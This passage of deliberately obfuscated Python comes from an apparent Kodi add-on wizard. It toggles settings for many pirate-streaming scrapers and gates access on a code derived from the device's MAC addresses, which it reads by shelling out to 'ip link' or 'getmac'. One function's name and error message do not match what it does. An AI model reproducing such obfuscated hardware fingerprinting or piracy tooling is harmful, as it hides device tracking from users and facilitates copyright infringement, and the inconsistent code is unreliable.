		OO00OO0O0OOOO0O0O .setSetting ('mjy','false')#line:1944
		OO00OO0O0OOOO0O0O .setSetting ('hdonline','false')#line:1945
		OO00OO0O0OOOO0O0O .setSetting ('moviex','false')#line:1946
		OO00OO0O0OOOO0O0O .setSetting ('mpr','false')#line:1947
		OO00OO0O0OOOO0O0O .setSetting ('mvg','false')#line:1948
		OO00OO0O0OOOO0O0O .setSetting ('mvl','false')#line:1949
		OO00OO0O0OOOO0O0O .setSetting ('mvs','false')#line:1950
		OO00OO0O0OOOO0O0O .setSetting ('myeg','false')#line:1951
		OO00OO0O0OOOO0O0O .setSetting ('ninja','false')#line:1952
		OO00OO0O0OOOO0O0O .setSetting ('odb','false')#line:1953
		OO00OO0O0OOOO0O0O .setSetting ('ophd','false')#line:1954
		OO00OO0O0OOOO0O0O .setSetting ('pks','false')#line:1955
		OO00OO0O0OOOO0O0O .setSetting ('prf','false')#line:1956
		OO00OO0O0OOOO0O0O .setSetting ('put18','false')#line:1957
		OO00OO0O0OOOO0O0O .setSetting ('req','false')#line:1958
		OO00OO0O0OOOO0O0O .setSetting ('rftv','false')#line:1959
		OO00OO0O0OOOO0O0O .setSetting ('rltv','false')#line:1960
		OO00OO0O0OOOO0O0O .setSetting ('sc','false')#line:1961
		OO00OO0O0OOOO0O0O .setSetting ('seehd','false')#line:1962
		OO00OO0O0OOOO0O0O .setSetting ('showbox','false')#line:1963
		OO00OO0O0OOOO0O0O .setSetting ('shuid','false')#line:1964
		OO00OO0O0OOOO0O0O .setSetting ('sil_gh','false')#line:1965
		OO00OO0O0OOOO0O0O .setSetting ('spv','false')#line:1966
		OO00OO0O0OOOO0O0O .setSetting ('subs','false')#line:1967
		OO00OO0O0OOOO0O0O .setSetting ('tvs','false')#line:1968
		OO00OO0O0OOOO0O0O .setSetting ('tw','false')#line:1969
		OO00OO0O0OOOO0O0O .setSetting ('upto','false')#line:1970
		OO00OO0O0OOOO0O0O .setSetting ('vel','false')#line:1971
		OO00OO0O0OOOO0O0O .setSetting ('vex','false')#line:1972
		OO00OO0O0OOOO0O0O .setSetting ('vidc','false')#line:1973
		OO00OO0O0OOOO0O0O .setSetting ('w4hd','false')#line:1974
		OO00OO0O0OOOO0O0O .setSetting ('wav','false')#line:1975
		OO00OO0O0OOOO0O0O .setSetting ('wf','false')#line:1976
		OO00OO0O0OOOO0O0O .setSetting ('wse','false')#line:1977
		OO00OO0O0OOOO0O0O .setSetting ('wss','false')#line:1978
		OO00OO0O0OOOO0O0O .setSetting ('wsse','false')#line:1979
		OO00OO0O0OOOO0O0O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1980
		OO00OO0O0OOOO0O0O .setSetting ('debrid.only','true')#line:1981
		OO00OO0O0OOOO0O0O .setSetting ('hosts.captcha','false')#line:1982
		OO00OO0O0OOOO0O0O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1983
		OO00OO0O0OOOO0O0O .setSetting ('provider.123moviehd','false')#line:1984
		OO00OO0O0OOOO0O0O .setSetting ('provider.300mbdownload','false')#line:1985
		OO00OO0O0OOOO0O0O .setSetting ('provider.alltube','false')#line:1986
		OO00OO0O0OOOO0O0O .setSetting ('provider.allucde','false')#line:1987
		OO00OO0O0OOOO0O0O .setSetting ('provider.animebase','false')#line:1988
		OO00OO0O0OOOO0O0O .setSetting ('provider.animeloads','false')#line:1989
		OO00OO0O0OOOO0O0O .setSetting ('provider.animetoon','false')#line:1990
		OO00OO0O0OOOO0O0O .setSetting ('provider.bnwmovies','false')#line:1991
		OO00OO0O0OOOO0O0O .setSetting ('provider.boxfilm','false')#line:1992
		OO00OO0O0OOOO0O0O .setSetting ('provider.bs','false')#line:1993
		OO00OO0O0OOOO0O0O .setSetting ('provider.cartoonhd','false')#line:1994
		OO00OO0O0OOOO0O0O .setSetting ('provider.cdahd','false')#line:1995
		OO00OO0O0OOOO0O0O .setSetting ('provider.cdax','false')#line:1996
		OO00OO0O0OOOO0O0O .setSetting ('provider.cine','false')#line:1997
		OO00OO0O0OOOO0O0O .setSetting ('provider.cinenator','false')#line:1998
		OO00OO0O0OOOO0O0O .setSetting ('provider.cmovieshdbz','false')#line:1999
		OO00OO0O0OOOO0O0O .setSetting ('provider.coolmoviezone','false')#line:2000
		OO00OO0O0OOOO0O0O .setSetting ('provider.ddl','false')#line:2001
		OO00OO0O0OOOO0O0O .setSetting ('provider.deepmovie','false')#line:2002
		OO00OO0O0OOOO0O0O .setSetting ('provider.ekinomaniak','false')#line:2003
		OO00OO0O0OOOO0O0O .setSetting ('provider.ekinotv','false')#line:2004
		OO00OO0O0OOOO0O0O .setSetting ('provider.filiser','false')#line:2005
		OO00OO0O0OOOO0O0O .setSetting ('provider.filmpalast','false')#line:2006
		OO00OO0O0OOOO0O0O .setSetting ('provider.filmwebbooster','false')#line:2007
		OO00OO0O0OOOO0O0O .setSetting ('provider.filmxy','false')#line:2008
		OO00OO0O0OOOO0O0O .setSetting ('provider.fmovies','false')#line:2009
		OO00OO0O0OOOO0O0O .setSetting ('provider.foxx','false')#line:2010
		OO00OO0O0OOOO0O0O .setSetting ('provider.freefmovies','false')#line:2011
		OO00OO0O0OOOO0O0O .setSetting ('provider.freeputlocker','false')#line:2012
		OO00OO0O0OOOO0O0O .setSetting ('provider.furk','false')#line:2013
		OO00OO0O0OOOO0O0O .setSetting ('provider.gamatotv','false')#line:2014
		OO00OO0O0OOOO0O0O .setSetting ('provider.gogoanime','false')#line:2015
		OO00OO0O0OOOO0O0O .setSetting ('provider.gowatchseries','false')#line:2016
		OO00OO0O0OOOO0O0O .setSetting ('provider.hackimdb','false')#line:2017
		OO00OO0O0OOOO0O0O .setSetting ('provider.hdfilme','false')#line:2018
		OO00OO0O0OOOO0O0O .setSetting ('provider.hdmto','false')#line:2019
		OO00OO0O0OOOO0O0O .setSetting ('provider.hdpopcorns','false')#line:2020
		OO00OO0O0OOOO0O0O .setSetting ('provider.hdstreams','false')#line:2021
		OO00OO0O0OOOO0O0O .setSetting ('provider.horrorkino','false')#line:2023
		OO00OO0O0OOOO0O0O .setSetting ('provider.iitv','false')#line:2024
		OO00OO0O0OOOO0O0O .setSetting ('provider.iload','false')#line:2025
		OO00OO0O0OOOO0O0O .setSetting ('provider.iwaatch','false')#line:2026
		OO00OO0O0OOOO0O0O .setSetting ('provider.kinodogs','false')#line:2027
		OO00OO0O0OOOO0O0O .setSetting ('provider.kinoking','false')#line:2028
		OO00OO0O0OOOO0O0O .setSetting ('provider.kinow','false')#line:2029
		OO00OO0O0OOOO0O0O .setSetting ('provider.kinox','false')#line:2030
		OO00OO0O0OOOO0O0O .setSetting ('provider.lichtspielhaus','false')#line:2031
		OO00OO0O0OOOO0O0O .setSetting ('provider.liomenoi','false')#line:2032
		OO00OO0O0OOOO0O0O .setSetting ('provider.magnetdl','false')#line:2035
		OO00OO0O0OOOO0O0O .setSetting ('provider.megapelistv','false')#line:2036
		OO00OO0O0OOOO0O0O .setSetting ('provider.movie2k-ac','false')#line:2037
		OO00OO0O0OOOO0O0O .setSetting ('provider.movie2k-ag','false')#line:2038
		OO00OO0O0OOOO0O0O .setSetting ('provider.movie2z','false')#line:2039
		OO00OO0O0OOOO0O0O .setSetting ('provider.movie4k','false')#line:2040
		OO00OO0O0OOOO0O0O .setSetting ('provider.movie4kis','false')#line:2041
		OO00OO0O0OOOO0O0O .setSetting ('provider.movieneo','false')#line:2042
		OO00OO0O0OOOO0O0O .setSetting ('provider.moviesever','false')#line:2043
		OO00OO0O0OOOO0O0O .setSetting ('provider.movietown','false')#line:2044
		OO00OO0O0OOOO0O0O .setSetting ('provider.mvrls','false')#line:2046
		OO00OO0O0OOOO0O0O .setSetting ('provider.netzkino','false')#line:2047
		OO00OO0O0OOOO0O0O .setSetting ('provider.odb','false')#line:2048
		OO00OO0O0OOOO0O0O .setSetting ('provider.openkatalog','false')#line:2049
		OO00OO0O0OOOO0O0O .setSetting ('provider.ororo','false')#line:2050
		OO00OO0O0OOOO0O0O .setSetting ('provider.paczamy','false')#line:2051
		OO00OO0O0OOOO0O0O .setSetting ('provider.peliculasdk','false')#line:2052
		OO00OO0O0OOOO0O0O .setSetting ('provider.pelisplustv','false')#line:2053
		OO00OO0O0OOOO0O0O .setSetting ('provider.pepecine','false')#line:2054
		OO00OO0O0OOOO0O0O .setSetting ('provider.primewire','false')#line:2055
		OO00OO0O0OOOO0O0O .setSetting ('provider.projectfreetv','false')#line:2056
		OO00OO0O0OOOO0O0O .setSetting ('provider.proxer','false')#line:2057
		OO00OO0O0OOOO0O0O .setSetting ('provider.pureanime','false')#line:2058
		OO00OO0O0OOOO0O0O .setSetting ('provider.putlocker','false')#line:2059
		OO00OO0O0OOOO0O0O .setSetting ('provider.putlockerfree','false')#line:2060
		OO00OO0O0OOOO0O0O .setSetting ('provider.reddit','false')#line:2061
		OO00OO0O0OOOO0O0O .setSetting ('provider.cartoonwire','false')#line:2062
		OO00OO0O0OOOO0O0O .setSetting ('provider.seehd','false')#line:2063
		OO00OO0O0OOOO0O0O .setSetting ('provider.segos','false')#line:2064
		OO00OO0O0OOOO0O0O .setSetting ('provider.serienstream','false')#line:2065
		OO00OO0O0OOOO0O0O .setSetting ('provider.series9','false')#line:2066
		OO00OO0O0OOOO0O0O .setSetting ('provider.seriesever','false')#line:2067
		OO00OO0O0OOOO0O0O .setSetting ('provider.seriesonline','false')#line:2068
		OO00OO0O0OOOO0O0O .setSetting ('provider.seriespapaya','false')#line:2069
		OO00OO0O0OOOO0O0O .setSetting ('provider.sezonlukdizi','false')#line:2070
		OO00OO0O0OOOO0O0O .setSetting ('provider.solarmovie','false')#line:2071
		OO00OO0O0OOOO0O0O .setSetting ('provider.solarmoviez','false')#line:2072
		OO00OO0O0OOOO0O0O .setSetting ('provider.stream-to','false')#line:2073
		OO00OO0O0OOOO0O0O .setSetting ('provider.streamdream','false')#line:2074
		OO00OO0O0OOOO0O0O .setSetting ('provider.streamflix','false')#line:2075
		OO00OO0O0OOOO0O0O .setSetting ('provider.streamit','false')#line:2076
		OO00OO0O0OOOO0O0O .setSetting ('provider.swatchseries','false')#line:2077
		OO00OO0O0OOOO0O0O .setSetting ('provider.szukajkatv','false')#line:2078
		OO00OO0O0OOOO0O0O .setSetting ('provider.tainiesonline','false')#line:2079
		OO00OO0O0OOOO0O0O .setSetting ('provider.tainiomania','false')#line:2080
		OO00OO0O0OOOO0O0O .setSetting ('provider.tata','false')#line:2083
		OO00OO0O0OOOO0O0O .setSetting ('provider.trt','false')#line:2084
		OO00OO0O0OOOO0O0O .setSetting ('provider.tvbox','false')#line:2085
		OO00OO0O0OOOO0O0O .setSetting ('provider.ultrahd','false')#line:2086
		OO00OO0O0OOOO0O0O .setSetting ('provider.video4k','false')#line:2087
		OO00OO0O0OOOO0O0O .setSetting ('provider.vidics','false')#line:2088
		OO00OO0O0OOOO0O0O .setSetting ('provider.view4u','false')#line:2089
		OO00OO0O0OOOO0O0O .setSetting ('provider.watchseries','false')#line:2090
		OO00OO0O0OOOO0O0O .setSetting ('provider.xrysoi','false')#line:2091
		OO00OO0O0OOOO0O0O .setSetting ('provider.library','false')#line:2092
def fixfont ():#line:2095
	O0O00O0OOO0O0O0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:2096
	O0000OOOOO00OOOO0 =json .loads (O0O00O0OOO0O0O0O0 );#line:2098
	OO00O00O0O00OOOOO =O0000OOOOO00OOOO0 ["result"]["settings"]#line:2099
	O000OOOOOOOOOO00O =[OOOO0O0OOOO0O00O0 for OOOO0O0OOOO0O00O0 in OO00O00O0O00OOOOO if OOOO0O0OOOO0O00O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:2101
	O00O0OOO0OOOO000O =O000OOOOOOOOOO00O ["options"];#line:2102
	OO0OO0O0OO0OO0OO0 =O000OOOOOOOOOO00O ["value"];#line:2103
	O0O00OO00O0OO0O0O =[OO00OO0O0O000OOO0 for (OO00OO0O0O000OOO0 ,O0O000OOO0000OOO0 )in enumerate (O00O0OOO0OOOO000O )if O0O000OOO0000OOO0 ["value"]==OO0OO0O0OO0OO0OO0 ][0 ];#line:2105
	O000OO0000O0OO00O =(O0O00OO00O0OO0O0O +1 )%len (O00O0OOO0OOOO000O )#line:2107
	OO00OOO00OOOO000O =O00O0OOO0OOOO000O [O000OO0000O0OO00O ]["value"]#line:2109
	O00O000O0OO00000O =O00O0OOO0OOOO000O [O000OO0000O0OO00O ]["label"]#line:2110
	OO00OOO00OO0O0O0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2112
	try :#line:2114
		O0OOOO00O0O0O0OO0 =json .loads (OO00OOO00OO0O0O0O );#line:2115
		if O0OOOO00O0O0O0OO0 ["result"]!=True :#line:2117
			raise Exception #line:2118
	except :#line:2119
		sys .stderr .write ("Error switching audio output device")#line:2120
		raise Exception #line:2121
def parseDOM2 (OO0OO0OOO0O00O0OO ,name =u"",attrs ={},ret =False ):#line:2122
	if isinstance (OO0OO0OOO0O00O0OO ,str ):#line:2125
		try :#line:2126
			OO0OO0OOO0O00O0OO =[OO0OO0OOO0O00O0OO .decode ("utf-8")]#line:2127
		except :#line:2128
			OO0OO0OOO0O00O0OO =[OO0OO0OOO0O00O0OO ]#line:2129
	elif isinstance (OO0OO0OOO0O00O0OO ,unicode ):#line:2130
		OO0OO0OOO0O00O0OO =[OO0OO0OOO0O00O0OO ]#line:2131
	elif not isinstance (OO0OO0OOO0O00O0OO ,list ):#line:2132
		return u""#line:2133
	if not name .strip ():#line:2135
		return u""#line:2136
	OOOOO00OOO000000O =[]#line:2138
	for O0OO00OO00O00O00O in OO0OO0OOO0O00O0OO :#line:2139
		O0O00OOO00O0OOO00 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO00OO00O00O00O )#line:2140
		for OOOOOO0O0OOO0000O in O0O00OOO00O0OOO00 :#line:2141
			O0OO00OO00O00O00O =O0OO00OO00O00O00O .replace (OOOOOO0O0OOO0000O ,OOOOOO0O0OOO0000O .replace ("\n"," "))#line:2142
		OO0OO00OOO00O0OOO =[]#line:2144
		for OOOO0O0OO0OO0O00O in attrs :#line:2145
			O0000OOOO0O0OO0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOOO0O0OO0OO0O00O +'=[\'"]'+attrs [OOOO0O0OO0OO0O00O ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO00OO00O00O00O )#line:2146
			if len (O0000OOOO0O0OO0OO )==0 and attrs [OOOO0O0OO0OO0O00O ].find (" ")==-1 :#line:2147
				O0000OOOO0O0OO0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOOO0O0OO0OO0O00O +'='+attrs [OOOO0O0OO0OO0O00O ]+'.*?>))',re .M |re .S ).findall (O0OO00OO00O00O00O )#line:2148
			if len (OO0OO00OOO00O0OOO )==0 :#line:2150
				OO0OO00OOO00O0OOO =O0000OOOO0O0OO0OO #line:2151
				O0000OOOO0O0OO0OO =[]#line:2152
			else :#line:2153
				O000OO000O00O0O0O =range (len (OO0OO00OOO00O0OOO ))#line:2154
				O000OO000O00O0O0O .reverse ()#line:2155
				for OOO0O0O00000OO0OO in O000OO000O00O0O0O :#line:2156
					if not OO0OO00OOO00O0OOO [OOO0O0O00000OO0OO ]in O0000OOOO0O0OO0OO :#line:2157
						del (OO0OO00OOO00O0OOO [OOO0O0O00000OO0OO ])#line:2158
		if len (OO0OO00OOO00O0OOO )==0 and attrs =={}:#line:2160
			OO0OO00OOO00O0OOO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO00OO00O00O00O )#line:2161
			if len (OO0OO00OOO00O0OOO )==0 :#line:2162
				OO0OO00OOO00O0OOO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO00OO00O00O00O )#line:2163
		if isinstance (ret ,str ):#line:2165
			O0000OOOO0O0OO0OO =[]#line:2166
			for OOOOOO0O0OOO0000O in OO0OO00OOO00O0OOO :#line:2167
				OO0OOOOOO0000O00O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOOO0O0OOO0000O )#line:2168
				if len (OO0OOOOOO0000O00O )==0 :#line:2169
					OO0OOOOOO0000O00O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOOO0O0OOO0000O )#line:2170
				for OO0OO0O000000OOOO in OO0OOOOOO0000O00O :#line:2171
					O00OOOOO0000OO0O0 =OO0OO0O000000OOOO [0 ]#line:2172
					if O00OOOOO0000OO0O0 in "'\"":#line:2173
						if OO0OO0O000000OOOO .find ('='+O00OOOOO0000OO0O0 ,OO0OO0O000000OOOO .find (O00OOOOO0000OO0O0 ,1 ))>-1 :#line:2174
							OO0OO0O000000OOOO =OO0OO0O000000OOOO [:OO0OO0O000000OOOO .find ('='+O00OOOOO0000OO0O0 ,OO0OO0O000000OOOO .find (O00OOOOO0000OO0O0 ,1 ))]#line:2175
						if OO0OO0O000000OOOO .rfind (O00OOOOO0000OO0O0 ,1 )>-1 :#line:2177
							OO0OO0O000000OOOO =OO0OO0O000000OOOO [1 :OO0OO0O000000OOOO .rfind (O00OOOOO0000OO0O0 )]#line:2178
					else :#line:2179
						if OO0OO0O000000OOOO .find (" ")>0 :#line:2180
							OO0OO0O000000OOOO =OO0OO0O000000OOOO [:OO0OO0O000000OOOO .find (" ")]#line:2181
						elif OO0OO0O000000OOOO .find ("/")>0 :#line:2182
							OO0OO0O000000OOOO =OO0OO0O000000OOOO [:OO0OO0O000000OOOO .find ("/")]#line:2183
						elif OO0OO0O000000OOOO .find (">")>0 :#line:2184
							OO0OO0O000000OOOO =OO0OO0O000000OOOO [:OO0OO0O000000OOOO .find (">")]#line:2185
					O0000OOOO0O0OO0OO .append (OO0OO0O000000OOOO .strip ())#line:2187
			OO0OO00OOO00O0OOO =O0000OOOO0O0OO0OO #line:2188
		else :#line:2189
			O0000OOOO0O0OO0OO =[]#line:2190
			for OOOOOO0O0OOO0000O in OO0OO00OOO00O0OOO :#line:2191
				O0O0OOOO0O0O00000 =u"</"+name #line:2192
				OO0OO0OO000O00O0O =O0OO00OO00O00O00O .find (OOOOOO0O0OOO0000O )#line:2194
				O0O0O0000O0OOOO0O =O0OO00OO00O00O00O .find (O0O0OOOO0O0O00000 ,OO0OO0OO000O00O0O )#line:2195
				OOOOOO00O00O000O0 =O0OO00OO00O00O00O .find ("<"+name ,OO0OO0OO000O00O0O +1 )#line:2196
				while OOOOOO00O00O000O0 <O0O0O0000O0OOOO0O and OOOOOO00O00O000O0 !=-1 :#line:2198
					OO0O0OOO0O00OO000 =O0OO00OO00O00O00O .find (O0O0OOOO0O0O00000 ,O0O0O0000O0OOOO0O +len (O0O0OOOO0O0O00000 ))#line:2199
					if OO0O0OOO0O00OO000 !=-1 :#line:2200
						O0O0O0000O0OOOO0O =OO0O0OOO0O00OO000 #line:2201
					OOOOOO00O00O000O0 =O0OO00OO00O00O00O .find ("<"+name ,OOOOOO00O00O000O0 +1 )#line:2202
				if OO0OO0OO000O00O0O ==-1 and O0O0O0000O0OOOO0O ==-1 :#line:2204
					OOO0O00OOOOO0OOO0 =u""#line:2205
				elif OO0OO0OO000O00O0O >-1 and O0O0O0000O0OOOO0O >-1 :#line:2206
					OOO0O00OOOOO0OOO0 =O0OO00OO00O00O00O [OO0OO0OO000O00O0O +len (OOOOOO0O0OOO0000O ):O0O0O0000O0OOOO0O ]#line:2207
				elif O0O0O0000O0OOOO0O >-1 :#line:2208
					OOO0O00OOOOO0OOO0 =O0OO00OO00O00O00O [:O0O0O0000O0OOOO0O ]#line:2209
				elif OO0OO0OO000O00O0O >-1 :#line:2210
					OOO0O00OOOOO0OOO0 =O0OO00OO00O00O00O [OO0OO0OO000O00O0O +len (OOOOOO0O0OOO0000O ):]#line:2211
				if ret :#line:2213
					O0O0OOOO0O0O00000 =O0OO00OO00O00O00O [O0O0O0000O0OOOO0O :O0OO00OO00O00O00O .find (">",O0OO00OO00O00O00O .find (O0O0OOOO0O0O00000 ))+1 ]#line:2214
					OOO0O00OOOOO0OOO0 =OOOOOO0O0OOO0000O +OOO0O00OOOOO0OOO0 +O0O0OOOO0O0O00000 #line:2215
				O0OO00OO00O00O00O =O0OO00OO00O00O00O [O0OO00OO00O00O00O .find (OOO0O00OOOOO0OOO0 ,O0OO00OO00O00O00O .find (OOOOOO0O0OOO0000O ))+len (OOO0O00OOOOO0OOO0 ):]#line:2217
				O0000OOOO0O0OO0OO .append (OOO0O00OOOOO0OOO0 )#line:2218
			OO0OO00OOO00O0OOO =O0000OOOO0O0OO0OO #line:2219
		OOOOO00OOO000000O +=OO0OO00OOO00O0OOO #line:2220
	return OOOOO00OOO000000O #line:2222
def addItem (O0OOOOO00OOO0O00O ,O0O00000OO0O000O0 ,O00OOO00O0O0OOOO0 ,OOOO0OO0OOO0O000O ,O0000OO0O00OOOOOO ,description =None ):#line:2224
	if description ==None :description =''#line:2225
	description ='[COLOR white]'+description +'[/COLOR]'#line:2226
	O0000OOOOOO000O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O00000OO0O000O0 )+"&mode="+str (O00OOO00O0O0OOOO0 )+"&name="+urllib .quote_plus (O0OOOOO00OOO0O00O )+"&iconimage="+urllib .quote_plus (OOOO0OO0OOO0O000O )+"&fanart="+urllib .quote_plus (O0000OO0O00OOOOOO )#line:2227
	O00OOOO0OO00O00OO =True #line:2228
	O00OO00OOO0OO0O00 =xbmcgui .ListItem (O0OOOOO00OOO0O00O ,iconImage =OOOO0OO0OOO0O000O ,thumbnailImage =OOOO0OO0OOO0O000O )#line:2229
	O00OO00OOO0OO0O00 .setInfo (type ="Video",infoLabels ={"Title":O0OOOOO00OOO0O00O ,"Plot":description })#line:2230
	O00OO00OOO0OO0O00 .setProperty ("fanart_Image",O0000OO0O00OOOOOO )#line:2231
	O00OO00OOO0OO0O00 .setProperty ("icon_Image",OOOO0OO0OOO0O000O )#line:2232
	O00OOOO0OO00O00OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0000OOOOOO000O0O ,listitem =O00OO00OOO0OO0O00 ,isFolder =False )#line:2233
	return O00OOOO0OO00O00OO #line:2234
def get_params ():#line:2236
		OO0O0OOOOOOOO00OO =[]#line:2237
		O0OOO00O0O00O0O0O =sys .argv [2 ]#line:2238
		if len (O0OOO00O0O00O0O0O )>=2 :#line:2239
				O000O0OO00O00O00O =sys .argv [2 ]#line:2240
				OOO00O000OOO0OO0O =O000O0OO00O00O00O .replace ('?','')#line:2241
				if (O000O0OO00O00O00O [len (O000O0OO00O00O00O )-1 ]=='/'):#line:2242
						O000O0OO00O00O00O =O000O0OO00O00O00O [0 :len (O000O0OO00O00O00O )-2 ]#line:2243
				OOO000000O0OO0O0O =OOO00O000OOO0OO0O .split ('&')#line:2244
				OO0O0OOOOOOOO00OO ={}#line:2245
				for OO0OO0000O0OOO0O0 in range (len (OOO000000O0OO0O0O )):#line:2246
						OOO0O0O0000000OOO ={}#line:2247
						OOO0O0O0000000OOO =OOO000000O0OO0O0O [OO0OO0000O0OOO0O0 ].split ('=')#line:2248
						if (len (OOO0O0O0000000OOO ))==2 :#line:2249
								OO0O0OOOOOOOO00OO [OOO0O0O0000000OOO [0 ]]=OOO0O0O0000000OOO [1 ]#line:2250
		return OO0O0OOOOOOOO00OO #line:2252
def decode (OO00O0OOOO000OO00 ,O00O0O00O0O0OO000 ):#line:2257
    import base64 #line:2258
    O00O00000000OO0O0 =[]#line:2259
    if (len (OO00O0OOOO000OO00 ))!=4 :#line:2261
     return 10 #line:2262
    O00O0O00O0O0OO000 =base64 .urlsafe_b64decode (O00O0O00O0O0OO000 )#line:2263
    for OO000000O0O0OO00O in range (len (O00O0O00O0O0OO000 )):#line:2265
        O0O0000000000O00O =OO00O0OOOO000OO00 [OO000000O0O0OO00O %len (OO00O0OOOO000OO00 )]#line:2266
        O00O000OOOOOO0O00 =chr ((256 +ord (O00O0O00O0O0OO000 [OO000000O0O0OO00O ])-ord (O0O0000000000O00O ))%256 )#line:2267
        O00O00000000OO0O0 .append (O00O000OOOOOO0O00 )#line:2268
    return "".join (O00O00000000OO0O0 )#line:2269
def tmdb_list (OO0O00OO00OOOOO00 ):#line:2270
    O00000OO0O0O00O0O =decode ("7643",OO0O00OO00OOOOO00 )#line:2273
    return int (O00000OO0O0O00O0O )#line:2276
def u_list (O00OOO00O00O0OO0O ):#line:2277
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2279
        from math import sqrt #line:2280
        O0000OOO00OOOO00O =tmdb_list (TMDB_NEW_API )#line:2281
        OO0000OOO0O00000O =str ((getHwAddr ('eth0'))*O0000OOO00OOOO00O )#line:2282
        O0O0O00OOO00O00OO =int (OO0000OOO0O00000O [1 ]+OO0000OOO0O00000O [2 ]+OO0000OOO0O00000O [5 ]+OO0000OOO0O00000O [7 ])#line:2283
        OO0OOO0O0OO00OO00 =(ADDON .getSetting ("pass"))#line:2284
        OOO0OOO000OOO0000 =(str (round (sqrt ((O0O0O00OOO00O00OO *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2285
        if '.'in OOO0OOO000OOO0000 :#line:2287
         OOO0OOO000OOO0000 =(str (round (sqrt ((O0O0O00OOO00O00OO *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2288
        if OO0OOO0O0OO00OO00 ==OOO0OOO000OOO0000 :#line:2290
          O0OO0O0000OOOOO00 =O00OOO00O00O0OO0O #line:2292
          return O0OO0O0000OOOOO00 ,O0O0O00OOO00O00OO #line:2293
        else :#line:2294
           wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מאמת נתונים, אנא המתן...[/COLOR]'%COLOR2 )#line:2295
           if wiz .STARTP2 ()=='ok':#line:2296
             check_firebase ()#line:2298
             return O00OOO00O00O0OO0O #line:2299
        return 'ok',O0O0O00OOO00O00OO #line:2302
    else :#line:2303
           if wiz .STARTP2 ()=='ok':#line:2304
             check_firebase ()#line:2307
             return O00OOO00O00O0OO0O #line:2308
def disply_hwr ():#line:2309
   try :#line:2310
    O00OOO000O0OO0OO0 =tmdb_list (TMDB_NEW_API )#line:2311
    OOO0O0OO000O0O0O0 =str ((getHwAddr ('eth0'))*O00OOO000O0OO0OO0 )#line:2312
    O0O000O0000O00000 =(OOO0O0OO000O0O0O0 [1 ]+OOO0O0OO000O0O0O0 [2 ]+OOO0O0OO000O0O0O0 [5 ]+OOO0O0OO000O0O0O0 [7 ])#line:2319
    O0OO0OO000OOO000O =(ADDON .getSetting ("action"))#line:2320
    wiz .setS ('action',str (O0O000O0000O00000 ))#line:2322
   except :pass #line:2323
def disply_hwr2 ():#line:2324
   try :#line:2325
    OO0O000OO0O0O0000 =tmdb_list (TMDB_NEW_API )#line:2326
    OOO0O0OOOOO0O0O0O =str ((getHwAddr ('eth0'))*OO0O000OO0O0O0000 )#line:2328
    O0000OO0OO00OO00O =(OOO0O0OOOOO0O0O0O [1 ]+OOO0O0OOOOO0O0O0O [2 ]+OOO0O0OOOOO0O0O0O [5 ]+OOO0O0OOOOO0O0O0O [7 ])#line:2337
    O0OOO00OO000O000O =(ADDON .getSetting ("action"))#line:2338
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0000OO0OO00OO00O )#line:2341
   except :pass #line:2342
def getHwAddr (O0O0O0OOO000000O0 ):#line:2343
   import subprocess ,time #line:2344
   OOOO0OOO0O00000O0 ='windows'#line:2345
   if xbmc .getCondVisibility ('system.platform.android'):#line:2346
       OOOO0OOO0O00000O0 ='android'#line:2347
   if xbmc .getCondVisibility ('system.platform.android'):#line:2348
     O00O0O0OOO0O000O0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2349
     OOO0OOO00O0OOOO00 =re .compile ('link/ether (.+?) brd').findall (str (O00O0O0OOO0O000O0 ))#line:2350
     OOO0OOOO00OO0O0O0 =0 #line:2351
     for OO0OO00000000OOOO in OOO0OOO00O0OOOO00 :#line:2352
      if OOO0OOO00O0OOOO00 !='00:00:00:00:00:00':#line:2353
          OOOO0000OO0O0O0O0 =OO0OO00000000OOOO #line:2354
          OOO0OOOO00OO0O0O0 =OOO0OOOO00OO0O0O0 +int (OOOO0000OO0O0O0O0 .replace (':',''),16 )#line:2355
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2356
       O0O0OOOOOO00OOO0O =0 #line:2357
       OOO0OOOO00OO0O0O0 =0 #line:2358
       O0000OOO0O000OOO0 =[]#line:2359
       OO00O00O0O00O0OOO =os .popen ("getmac").read ()#line:2360
       OO00O00O0O00O0OOO =OO00O00O0O00O0OOO .split ("\n")#line:2361
       for OO0000O00000OO0O0 in OO00O00O0O00O0OOO :#line:2362
            OOOO0OOOO0O0OO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0000O00000OO0O0 ,re .I )#line:2363
            if OOOO0OOOO0O0OO00O :#line:2364
                OOO0OOO00O0OOOO00 =OOOO0OOOO0O0OO00O .group ().replace ('-',':')#line:2365
                O0000OOO0O000OOO0 .append (OOO0OOO00O0OOOO00 )#line:2366
                OOO0OOOO00OO0O0O0 =OOO0OOOO00OO0O0O0 +int (OOO0OOO00O0OOOO00 .replace (':',''),16 )#line:2367
   else :#line:2368
       O0O0OOOOOO00OOO0O =0 #line:2369
       OOO0OOOO00OO0O0O0 =0 #line:2370
